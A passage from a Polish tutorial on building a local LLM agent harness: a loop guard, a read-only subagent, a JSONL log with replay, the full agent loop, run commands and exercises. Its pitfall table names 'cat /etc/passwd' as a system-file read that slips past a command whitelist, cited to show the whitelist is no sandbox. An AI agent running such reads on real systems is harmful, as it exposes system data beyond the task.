cat > $AGENT/odzyskiwanie.py <<'PYEOF'
#!/usr/bin/env python3
"""Wykrywanie i przerywanie patologicznych zachowan agenta."""
from collections import Counter

class Straznik:
    def __init__(self, max_tur: int = 25, max_powtorzen: int = 3,
                 max_bledow_pod_rzad: int = 4):
        self.max_tur = max_tur
        self.max_powtorzen = max_powtorzen
        self.max_bledow = max_bledow_pod_rzad
        self.kroki: list[tuple[str, str]] = []      # (narzedzie, odcisk argumentow)
        self.bledy_pod_rzad = 0
        self.tura = 0

    def zarejestruj(self, narzedzie: str, argumenty: dict, wynik: str):
        self.tura += 1
        odcisk = repr(sorted((k, str(v)[:80]) for k, v in argumenty.items()))
        self.kroki.append((narzedzie, odcisk))
        if str(wynik).startswith(("BŁĄD", "ODMOWA")):
            self.bledy_pod_rzad += 1
        else:
            self.bledy_pod_rzad = 0

    def problem(self) -> str | None:
        """Zwraca komunikat do wstrzykniecia agentowi albo None."""
        if self.tura >= self.max_tur:
            return f"STOP: limit {self.max_tur} tur. Podsumuj, co udało się ustalić, i użyj 'odpowiedz'."

        if self.bledy_pod_rzad >= self.max_bledow:
            return (f"UWAGA: {self.bledy_pod_rzad} błędów pod rząd. Zatrzymaj się. "
                    f"Nie powtarzaj tego samego. Albo zmień podejście, albo użyj "
                    f"'zapytaj_uzytkownika', albo 'odpowiedz' z opisem problemu.")

        # To samo narzedzie z tymi samymi argumentami N razy = petla
        if len(self.kroki) >= self.max_powtorzen:
            ostatnie = self.kroki[-self.max_powtorzen:]
            if len(set(ostatnie)) == 1:
                return (f"UWAGA: wywołałeś {ostatnie[0][0]} z identycznymi argumentami "
                        f"{self.max_powtorzen} razy. To pętla. Zmień podejście.")

        # Oscylacja miedzy dwoma narzedziami: A B A B A B
        if len(self.kroki) >= 6:
            szesc = [k[0] for k in self.kroki[-6:]]
            if len(set(szesc)) == 2 and szesc[::2] == szesc[1::2][:len(szesc[::2])]:
                pass  # wzorzec ABABAB - rzadki, ale warto go znac
            if len(set(szesc)) <= 2 and len(set(self.kroki[-6:])) <= 2:
                return ("UWAGA: krążysz między dwoma narzędziami bez postępu. "
                        "Podsumuj, czego się dowiedziałeś, i zdecyduj.")
        return None
PYEOF
```

⭐ **Cztery patologie, które musisz wykrywać** — każda spotkana w realnych agentach:

| Patologia | Wykrycie | Reakcja |
| :-- | :-- | :-- |
| **limit tur** | licznik | wymuś podsumowanie |
| **ta sama akcja N razy** | odcisk `(narzędzie, argumenty)` | wstrzyknij „to pętla, zmień podejście" |
| **N błędów pod rząd** | licznik zerowany sukcesem | każ zapytać człowieka |
| **oscylacja A↔B** | zbiór dwóch narzędzi w 6 krokach | każ podsumować i zdecydować |

💡 **Kluczowy trik: nie przerywaj — wstrzyknij komunikat.** Zamiast zabić pętlę, dodaj
do historii wiadomość `user`: „to pętla, zmień podejście". **Model zwykle się poprawia.**
Twarde przerwanie zostaw na limit tur.

---

## 9. Subagenci — delegacja

Gdy zadanie wymaga **przeczytania dużo**, ale zwrócenia **mało** — deleguj do subagenta
ze świeżym kontekstem.

```bash
cat > $AGENT/subagent.py <<'PYEOF'
#!/usr/bin/env python3
"""Subagent: wlasny, swiezy kontekst; zwraca tylko raport."""
import json, os, urllib.request

# ⚠️ Ta sama poprawka co w kontekst.py - respektuj LLM_URL, zamiast na
# sztywno wskazywac 8081.
LLM = os.environ.get("LLM_URL", "http://127.0.0.1:8081")

def subagent(zadanie: str, narzedzia_tylko_czytajace: dict,
             max_tur: int = 10, max_tokenow_raportu: int = 600) -> str:
    """Uruchamia podrzedna petle z WLASNA historia.

    Zwraca zwiezly raport. Kontekst rodzica NIE puchnie o wszystko,
    co subagent musial przeczytac.
    """
    opis = "\n".join(f"- {n}: {o}" for n, (o, _) in narzedzia_tylko_czytajace.items())
    schemat = {
        "type": "object",
        "properties": {
            "mysl":      {"type": "string"},
            "narzedzie": {"type": "string",
                          "enum": list(narzedzia_tylko_czytajace) + ["raport"]},
            "argumenty": {"type": "object"},
        },
        "required": ["mysl", "narzedzie", "argumenty"],
    }
    hist = [
        {"role": "system", "content":
            f"Jesteś subagentem badawczym. Masz JEDNO zadanie i tylko narzędzia "
            f"do czytania:\n{opis}\n- raport: kończy pracę i zwraca ustalenia.\n\n"
            f"Zbierz informacje i zwróć ZWIĘZŁY raport. Podaj konkrety: nazwy plików, "
            f"numery linii, liczby. Nie streszczaj ogólnikami."},
        {"role": "user", "content": zadanie},
    ]

    for _ in range(max_tur):
        req = urllib.request.Request(LLM + "/v1/chat/completions",
            data=json.dumps({"messages": hist, "max_tokens": 700, "temperature": 0,
                             "repeat_penalty": 1.0,
                             "response_format": {"type": "json_schema",
                                                 "json_schema": {"schema": schemat}}}).encode(),
            headers={"Content-Type": "application/json"})
        surowy = json.load(urllib.request.urlopen(req, timeout=300))["choices"][0]["message"]["content"]
        krok = json.loads(surowy)
        if krok["narzedzie"] == "raport":
            return krok["argumenty"].get("tresc", "(subagent nie podał treści)")
        _, fn = narzedzia_tylko_czytajace[krok["narzedzie"]]
        try:
            wynik = str(fn(**krok["argumenty"]))[:5000]
        except Exception as e:
            wynik = f"BŁĄD: {e}"
        hist.append({"role": "assistant", "content": surowy})
        hist.append({"role": "user", "content": f"Wynik: {wynik}"})

    return "(subagent nie zdążył w limicie tur)"
PYEOF
```

### 9.1 Kiedy delegować, a kiedy nie

| ✅ Deleguj | ❌ Nie deleguj |
| :-- | :-- |
| „przejrzyj 40 plików i znajdź, gdzie ustawiany jest limit mocy" | „przeczytaj ten jeden plik" |
| „sprawdź, które testy dotyczą modułu X" | „dopisz jedną linię do pliku" |
| zadania **czytające dużo, zwracające mało** | zadania **modyfikujące** |

⚠️ **Subagent nigdy nie dostaje narzędzi zapisujących.** Dwa powody: (1) nie widzi
całego zamiaru, więc może napisać coś sprzecznego; (2) rodzic traci kontrolę nad tym,
co się zmieniło. **Subagenci czytają, rodzic pisze.**

⚠️ **Pułapka P41 (nowa): delegacja ma koszt stały.**
Subagent musi od nowa ustalić kontekst zadania. Dla małego zadania **delegacja jest droższa
niż zrobienie tego samemu.** Deleguj, gdy przeczytanie przekracza ~20 % Twojego kontekstu.

---

## 10. Dziennik i odtwarzanie

⭐ **Bez tego nie zdebugujesz agenta.** Agent zawiódł po 18 turach — bez dziennika nie
dowiesz się, dlaczego.

```bash
cat > $AGENT/dziennik.py <<'PYEOF'
#!/usr/bin/env python3
"""Dziennik JSONL: kazdy krok agenta zapisany, mozliwy do odtworzenia."""
import json, os, time, uuid

class Dziennik:
    def __init__(self, katalog: str = "$AGENT/dzienniki"):
        self.kat = os.path.expanduser(os.path.expandvars(katalog))
        os.makedirs(self.kat, exist_ok=True)
        self.id = time.strftime("%Y%m%d-%H%M%S") + "-" + uuid.uuid4().hex[:6]
        self.plik = os.path.join(self.kat, f"{self.id}.jsonl")
        self.t0 = time.time()

    def _pisz(self, rekord: dict):
        rekord["t"] = round(time.time() - self.t0, 3)
        with open(self.plik, "a", encoding="utf-8") as f:
            f.write(json.dumps(rekord, ensure_ascii=False) + "\n")

    def start(self, zadanie: str, model: str, n_ctx: int):
        self._pisz({"typ": "start", "zadanie": zadanie, "model": model, "n_ctx": n_ctx})

    def krok(self, tura: int, mysl: str, narzedzie: str, argumenty: dict,
             wynik: str, tokeny: int | None = None, ms: float | None = None):
        self._pisz({"typ": "krok", "tura": tura, "mysl": mysl,
                    "narzedzie": narzedzie, "argumenty": argumenty,
                    "wynik": str(wynik)[:4000], "tokeny_kontekstu": tokeny, "ms": ms})

    def kompakcja(self, przed: int, po: int):
        self._pisz({"typ": "kompakcja", "wiadomosci_przed": przed, "wiadomosci_po": po})

    def interwencja(self, komunikat: str):
        self._pisz({"typ": "interwencja", "komunikat": komunikat})

    def koniec(self, wynik: str, tury: int, powod: str = "ok"):
        self._pisz({"typ": "koniec", "wynik": str(wynik)[:4000],
                    "tury": tury, "powod": powod})

# ---------- narzedzie do przegladania -----------------------------------
def pokaz(plik: str):
    for linia in open(os.path.expanduser(os.path.expandvars(plik)), encoding="utf-8"):
        r = json.loads(linia)
        t = r.get("t", 0)
        if r["typ"] == "start":
            print(f"[{t:7.2f}s] START  {r['zadanie'][:90]}")
            print(f"           model={os.path.basename(r['model'])} n_ctx={r['n_ctx']}")
        elif r["typ"] == "krok":
            blad = "❌" if str(r["wynik"]).startswith(("BŁĄD", "ODMOWA")) else "  "
            tok = f" ctx={r['tokeny_kontekstu']}" if r.get("tokeny_kontekstu") else ""
            ms  = f" {r['ms']:.0f}ms" if r.get("ms") else ""
            print(f"[{t:7.2f}s] {blad} {r['tura']:2d}. {r['narzedzie']:20s}{tok}{ms}")
            print(f"              mysl: {r['mysl'][:100]}")
            print(f"              arg:  {str(r['argumenty'])[:100]}")
            print(f"              ←     {str(r['wynik'])[:120]}")
        elif r["typ"] == "kompakcja":
            print(f"[{t:7.2f}s] 🗜  KOMPAKCJA {r['wiadomosci_przed']} → {r['wiadomosci_po']} wiadomości")
        elif r["typ"] == "interwencja":
            print(f"[{t:7.2f}s] ⚠️  STRAŻNIK: {r['komunikat'][:110]}")
        elif r["typ"] == "koniec":
            print(f"[{t:7.2f}s] KONIEC ({r['powod']}, {r['tury']} tur)")
            print(f"           {str(r['wynik'])[:300]}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        pokaz(sys.argv[1])
    else:
        kat = os.path.join(os.environ["AGENT"], "dzienniki")
        pliki = sorted(os.listdir(kat)) if os.path.isdir(kat) else []
        if pliki:
            print(f"=== najnowszy: {pliki[-1]} ===\n")
            pokaz(os.path.join(kat, pliki[-1]))
        else:
            print("brak dzienników")
PYEOF
```

💡 **Format JSONL jest celowy.** Jedna linia = jedno zdarzenie. Możesz to `grep`ować,
`tail -f`ować w trakcie pracy agenta i analizować w Pythonie. **Nie pakuj tego w JSON-a
jako jedną tablicę** — nie da się dopisywać ani śledzić na żywo.

---

## 11. Złożenie całości

```bash
cat > $AGENT/agent.py <<'PYEOF'
#!/usr/bin/env python3
"""AGENT — kompletna pętla. Części 2–6 kursu w jednym pliku.

Uzycie:
  python3 agent.py "zadanie do wykonania"
  python3 agent.py "zadanie" --bez-zgod        # nie pyta, odrzuca ryzykowne
  python3 agent.py "zadanie" --praca ~/projekt # inny katalog roboczy
"""
import json, os, sys, time, urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from narzedzia_plikowe  import Pliki
from narzedzie_powloka  import Powloka
from obserwacje         import sformatuj
from kontekst           import Kontekst, Notatnik
from odzyskiwanie       import Straznik
from dziennik           import Dziennik
from subagent           import subagent

LLM   = os.environ.get("LLM_URL", "http://127.0.0.1:8081")
MODEL = os.environ.get("MODEL_PATH",
    os.path.expanduser("~/models/gpt-oss-20b/gpt-oss-20b-MXFP4.gguf"))
N_CTX = int(os.environ.get("N_CTX", "16384"))

SYSTEM = """Jesteś agentem pracującym w katalogu roboczym użytkownika.

ZASADY PRACY
1. W każdej turze wybierasz DOKŁADNIE JEDNO narzędzie.
2. Przed edycją pliku ZAWSZE go przeczytaj — potrzebujesz dokładnej treści.
3. W 'stary_tekst' NIE dołączaj numerów linii ani prefiksu '  123| '.
4. 'stary_tekst' musi być UNIKALNY w pliku — dodaj kontekst, jeśli trzeba.
5. Ważne ustalenia (liczby, nazwy, wnioski) zapisuj przez 'zapisz_ustalenie'.
6. Gdy nie wiesz albo decyzja należy do człowieka — 'zapytaj_uzytkownika'.
7. Gdy zadanie jest zrobione — 'odpowiedz'.

STYL
- 'mysl' to JEDNO zdanie: co robisz i dlaczego.
- Nie powtarzaj nieudanej akcji. Zmień podejście.
- Nie wymyślaj treści plików — przeczytaj je."""


class Agent:
    def __init__(self, katalog_roboczy="$AGENT/praca", tryb_zgody="pytaj"):
        self.pliki  = Pliki(katalog_roboczy)
        self.sh     = Powloka(katalog_roboczy, tryb_zgody=tryb_zgody)
        self.ctx    = Kontekst(MODEL, n_ctx=N_CTX)
        self.notes  = Notatnik(os.path.join(self.pliki.root, ".agent-ustalenia.json"))
        self.log    = Dziennik()
        self.straz  = Straznik()
        self.narzedzia = self._zbuduj()

    # ---------- powierzchnia narzedzi ---------------------------------
    def _zbuduj(self) -> dict:
        czytajace = {
            "czytaj": ("Czyta plik i zwraca treść z numerami linii. Użyj ZAWSZE przed "
                       "edycją. Argumenty: sciezka, opcjonalnie od_linii i ile_linii.",
                       self.pliki.czytaj),
            "szukaj_plikow": ("Znajduje pliki po wzorcu glob, np. '*.py' albo 'src/**'. "
                              "Argument: wzorzec.", self.pliki.szukaj_plikow),
            "szukaj_w_tresci": ("Szuka wyrażenia regularnego w treści plików. Zwraca "
                                "plik:linia:treść. Argumenty: wzorzec, opcjonalnie katalog.",
                                self.pliki.szukaj_w_tresci),
        }
        return {
            **czytajace,
            "zapisz": ("Tworzy albo nadpisuje plik. Jeśli plik istnieje, musisz go "
                       "wcześniej przeczytać. Argumenty: sciezka, tresc.",
                       self.pliki.zapisz),
            "edytuj": ("Podmienia DOKŁADNIE JEDNO wystąpienie stary_tekst na nowy_tekst. "
                       "stary_tekst musi być unikalny i bez numerów linii. "
                       "Argumenty: sciezka, stary_tekst, nowy_tekst.",
                       self.pliki.edytuj),
            "powloka": ("Uruchamia jedno polecenie w katalogu roboczym. Bez ; && | > `. "
                        "Polecenia modyfikujące wymagają zgody użytkownika. "
                        "Argument: polecenie.", self.sh.uruchom),
            "zbadaj": ("Zleca subagentowi zadanie badawcze wymagające przeczytania wielu "
                       "plików. Zwraca zwięzły raport. Użyj, gdy musisz przejrzeć dużo "
                       "materiału. Argument: zadanie.",
                       lambda zadanie: subagent(zadanie, czytajace)),
            "zapisz_ustalenie": ("Zapisuje fakt do pamięci trwałej, która przeżywa "
                                 "kompakcję kontekstu. Argumenty: klucz, wartosc.",
                                 self.notes.zapisz),
            "zapytaj_uzytkownika": ("Zadaje pytanie człowiekowi i czeka na odpowiedź. "
                                    "Użyj, gdy decyzja nie należy do Ciebie. "
                                    "Argument: pytanie.", self._pytaj),
            "odpowiedz": ("Kończy pracę i przekazuje wynik. Argument: tresc.", None),
        }

    @staticmethod
    def _pytaj(pytanie: str) -> str:
        print(f"\n  ❓ AGENT PYTA: {pytanie}")
        return input("     Twoja odpowiedź: ").strip() or "(brak odpowiedzi)"

    # ---------- komunikacja z modelem ---------------------------------
    def _schemat(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "mysl":      {"type": "string"},
                "narzedzie": {"type": "string", "enum": list(self.narzedzia)},
                "argumenty": {"type": "object"},
            },
            "required": ["mysl", "narzedzie", "argumenty"],
        }

    def _zapytaj(self, messages: list[dict]) -> tuple[str, float]:
        t0 = time.time()
        req = urllib.request.Request(LLM + "/v1/chat/completions",
            data=json.dumps({
                "messages": messages, "max_tokens": 900,
                "temperature": 0, "repeat_penalty": 1.0, "seed": 42,
                "response_format": {"type": "json_schema",
                                    "json_schema": {"schema": self._schemat()}},
            }).encode(), headers={"Content-Type": "application/json"})
        r = json.load(urllib.request.urlopen(req, timeout=600))
        return r["choices"][0]["message"]["content"], (time.time() - t0) * 1000

    def _prompt_systemowy(self) -> str:
        opis = "\n".join(f"- {n}({', '.join(f'{k}' for k in [])}): {o}"
                         for n, (o, _) in self.narzedzia.items())
        opis = "\n".join(f"- {n}: {o}" for n, (o, _) in self.narzedzia.items())
        czesci = [SYSTEM, "", "NARZĘDZIA:", opis, "",
                  f"KATALOG ROBOCZY: {self.pliki.root}"]
        notatki = self.notes.jako_tekst()
        if notatki:
            czesci += ["", notatki]
        return "\n".join(czesci)

    # ---------- petla ---------------------------------------------------
    def uruchom(self, zadanie: str, max_tur: int = 25) -> str:
        self.straz.max_tur = max_tur
        self.log.start(zadanie, MODEL, N_CTX)
        hist = [{"role": "system", "content": self._prompt_systemowy()},
                {"role": "user",   "content": zadanie}]

        print(f"╭─ ZADANIE: {zadanie}")
        print(f"╰─ katalog: {self.pliki.root}\n")

        for tura in range(1, max_tur + 1):
            # --- kompakcja, jesli kontekst sie zapelnia ---------------
            if self.ctx.trzeba_kompaktowac(hist):
                przed = len(hist)
                hist = self.ctx.kompaktuj(hist)
                hist[0] = {"role": "system", "content": self._prompt_systemowy()}
                self.log.kompakcja(przed, len(hist))
                print(f"  🗜  kompakcja: {przed} → {len(hist)} wiadomości")

            # --- mysl ------------------------------------------------
            try:
                surowy, ms = self._zapytaj(hist)
                krok = json.loads(surowy)
            except Exception as e:
                print(f"  ❌ błąd modelu: {e}")
                self.log.koniec(f"błąd modelu: {e}", tura, "blad_modelu")
                return f"Przerwano: błąd modelu ({e})"

            nazwa, args = krok["narzedzie"], krok.get("argumenty", {})
            print(f"  {tura:2d}. {krok['mysl']}")
            print(f"      → {nazwa}({', '.join(f'{k}={str(v)[:40]!r}' for k, v in args.items())})")

            # --- koniec ---------------------------------------------
            if nazwa == "odpowiedz":
                tresc = args.get("tresc") or args.get("odpowiedz") or "(brak treści)"
                self.log.krok(tura, krok["mysl"], nazwa, args, tresc,
                              self.ctx.zuzycie(hist), ms)
                self.log.koniec(tresc, tura, "ok")
                return tresc

            # --- dzialaj ---------------------------------------------
            _, fn = self.narzedzia[nazwa]
            try:
                wynik = fn(**args) if fn else "BŁĄD: brak implementacji"
            except TypeError as e:
                wynik = f"BŁĄD argumentów narzędzia {nazwa}: {e}"
            except PermissionError as e:
                wynik = f"ODMOWA: {e}"
            except Exception as e:
                wynik = f"BŁĄD: {type(e).__name__}: {e}"

            print(f"      ← {str(wynik).splitlines()[0][:120] if str(wynik) else '(puste)'}")

            zuzycie = self.ctx.zuzycie(hist)
            self.log.krok(tura, krok["mysl"], nazwa, args, wynik, zuzycie, ms)

            # --- obserwuj -------------------------------------------
            hist.append({"role": "assistant", "content": surowy})
            hist.append({"role": "user", "content": sformatuj(nazwa, args, str(wynik))})

            # --- straznik -------------------------------------------
            self.straz.zarejestruj(nazwa, args, str(wynik))
            problem = self.straz.problem()
            if problem:
                print(f"      ⚠️  {problem[:110]}")
                self.log.interwencja(problem)
                hist.append({"role": "user", "content": problem})
                if problem.startswith("STOP"):
                    self.log.koniec("limit tur", tura, "limit")
                    return "Przerwano: limit tur."

        self.log.koniec("limit tur", max_tur, "limit")
        return "Przerwano: limit tur."


if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    zadanie = args[0] if args else "Wypisz pliki w katalogu roboczym i powiedz, co widzisz."
    praca = "$AGENT/praca"
    if "--praca" in sys.argv:
        praca = sys.argv[sys.argv.index("--praca") + 1]
    tryb = "odrzucaj" if "--bez-zgod" in sys.argv else "pytaj"

    a = Agent(praca, tryb_zgody=tryb)
    wynik = a.uruchom(zadanie)
    print(f"\n╭─ WYNIK\n{wynik}\n╰─ dziennik: {a.log.plik}")
PYEOF
chmod +x $AGENT/agent.py
```

### 11.1 Uruchom go

```bash
pkill -f llama-server; sleep 2
export HIP_VISIBLE_DEVICES=0,1
$LB/llama-server -m $OSS20 -ngl 999 -c 16384 --port 8081 --host 127.0.0.1 --no-warmup &
sleep 25

mkdir -p $AGENT/praca
cd $AGENT

# Zadanie 1: rozeznanie
python3 agent.py "Wypisz wszystkie pliki .py w katalogu roboczym i krótko opisz, co robi każdy."

# Zadanie 2: tworzenie
python3 agent.py "Napisz plik vat.py z funkcją brutto(netto, stawka) liczącą kwotę brutto. Dodaj trzy asserty sprawdzające stawki 23, 8 i 5 procent. Uruchom plik i pokaż wynik."

# Zadanie 3: edycja istniejacego
python3 agent.py "W pliku vat.py dodaj funkcję netto_z_brutto(brutto, stawka), która robi operację odwrotną. Dodaj assert sprawdzający, że dla 1230 i stawki 23 wyjdzie 1000."

# Przejrzyj dziennik
python3 dziennik.py
```

### 11.2 Co obserwować przy pierwszym uruchomieniu

| Obserwacja | Co znaczy |
| :-- | :-- |
| agent czyta plik przed edycją | ✅ opisy narzędzi działają |
| `edytuj` zwraca „nie znalazłem stary_tekst" | ⚠️ model dołączył numery linii — **popraw opis narzędzia** |
| agent powtarza to samo | ✅ strażnik powinien wstrzyknąć ostrzeżenie |
| kompakcja po ~15 turach | ✅ zarządzanie kontekstem działa |
| agent nie wywołuje `odpowiedz` | ⚠️ **P37** — wzmocnij zasadę 7 w prompcie |

⚠️ **Model 20B będzie się mylił częściej niż Claude.** To normalne. Twoją odpowiedzią
nie jest „lepszy prompt" w nieskończoność, a **mocniejszy harness**: lepsze komunikaty
błędów, wyraźniejsze opisy narzędzi, strażnik. **Harness kompensuje słabszy model —
to jest główna teza tego rozdziału.**

---

## Ćwiczenia

1. **Dodaj narzędzie `lista_katalogu(sciezka)`** — agent często marnuje turę na
   `powloka("ls")`. Dedykowane narzędzie jest szybsze i bezpieczniejsze.
2. **Zmierz, ile tur zajmują typowe zadania.** Uruchom pięć zadań, policz średnią
   z dzienników. To Twoja bazowa liczba — będziesz ją poprawiał w części 8.
3. **Porównaj modele na tym samym zadaniu:**
   ```bash
   for M in $OSS20 $QWEN32 $BIELIK; do
     pkill -f llama-server; sleep 3
     $LB/llama-server -m $M -ngl 999 -c 16384 --port 8081 --host 127.0.0.1 --no-warmup &
     sleep 30
     echo "=== $(basename $M)"
     MODEL_PATH=$M python3 agent.py "Napisz test dla funkcji brutto w vat.py i uruchom go." --bez-zgod
   done
   ```
   ⭐ **Zapisz, który model w ilu turach wykonał zadanie.** To Twój benchmark agentowy —
   ważniejszy niż tokeny/s.
4. **Zepsuj agenta celowo:** usuń `repeat_penalty: 1.0` z `_zapytaj`. Zobacz, jak zaczyna
   psuć JSON. **Przywróć i doceń P21.**
5. **Usuń kontrolę świeżości** z `Pliki.edytuj`. Uruchom agenta, a w trakcie jego myślenia
   zmień plik w edytorze. Zobacz, jak agent zjada Twoją zmianę. **Przywróć.**

---

## Sprawdź się

- [ ] Jakie są cztery kroki pętli agenta?
- [ ] Dlaczego `odpowiedz` jest narzędziem, a nie osobną ścieżką kodu?
- [ ] Kiedy awansować akcję z `bash` do dedykowanego narzędzia — cztery powody?
- [ ] Dlaczego `edytuj` wymaga dokładnego, unikalnego dopasowania?
- [ ] Co się stanie bez kontroli świeżości plików?
- [ ] Dlaczego przycinamy obserwacje ze środka, nie z końca?
- [ ] Dlaczego notatnik trwały jest potrzebny obok kontekstu?
- [ ] Dlaczego lepiej wstrzyknąć ostrzeżenie niż przerwać pętlę?
- [ ] Dlaczego subagenci nie dostają narzędzi zapisujących?
- [ ] Dlaczego biała lista poleceń nie jest piaskownicą?

## Nowe pułapki

| ID | Pułapka | § |
| :-- | :-- | :-- |
| **P37** | Model zapomina wywołać `odpowiedz` i krąży w pętli | §2.1 |
| **P38** | Brak kontroli świeżości — agent nadpisuje zmiany człowieka | §4.2 |
| **P39** | Biała lista poleceń nie jest piaskownicą (`cat /etc/passwd` przechodzi) | §5.1 |
| **P40** | Jedna wielka obserwacja wypełnia całe okno kontekstu | §6 |
| **P41** | Delegacja ma koszt stały — nie deleguj małych zadań | §9.1 |

---

**Następna część: `07-SANDBOX-BEZPIECZENSTWO-MONITORING.md`** — zamykasz agenta w klatce,
dajesz mu kontrolowany dostęp do sieci i terminala, i patrzysz mu na ręce.
